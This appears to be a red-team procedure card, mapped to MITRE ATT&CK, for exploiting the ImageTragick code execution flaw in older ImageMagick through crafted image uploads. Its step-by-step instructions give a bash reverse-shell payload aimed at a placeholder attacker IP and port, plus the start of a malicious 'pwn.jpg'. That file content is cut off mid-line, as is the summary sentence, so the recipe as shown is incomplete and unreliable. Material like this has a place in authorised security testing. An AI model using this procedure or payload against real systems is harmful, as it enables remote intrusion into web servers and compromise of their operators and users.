---
id: a2963329-aab2-48d0-b322-da9e74726b51
name: Exploit ImageMagick (ImageTragick) for Code Execution
type: procedure
verified: false
submitted: false
created_at: '2019-10-11T22:03:43.746513+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
platforms:
- Linux
- Windows
tags:
- '[[exploit]]'
- '[[Web Applications]]'
---

# Exploit ImageMagick (ImageTragick) for Code Execution

## Summary

ImageTragick is a code execution vulnerability found in ImageMagick tools before 6.9.3-10, and version 7.x prior to 7.0.1-1. As many web applications use ImageMagick for displaying and converting files,  uploading an image file containing a crafted payload may allow attackers to  execute arbitrary 

## Description

# Description

ImageTragick is a code execution vulnerability found in ImageMagick tools before 6.9.3-10, and version 7.x prior to 7.0.1-1. As many web applications use ImageMagick for displaying and converting files,  uploading an image file containing a crafted payload may allow attackers to  execute arbitrary commands when an image is processed.

# Instructions

1. Identify a vulnerable application and the method of delivering the file. Often this occurs via upload forms.

2. Select a payload. Suggested:

**Code**: [[bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT ]]

3. Create a new file `pwn.jpg` with the following contents and the payload from step 2.

**Code**: [[push graphic-context
viewbox 0 0 640 480
fill 'url]]

3. Upload the file. Code execution occurs when the file is processed by a vulnerable ImageMagick tool.

## Platforms

- Linux
- Windows

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]

## Tags

- [[exploit]]
- [[Web Applications]]
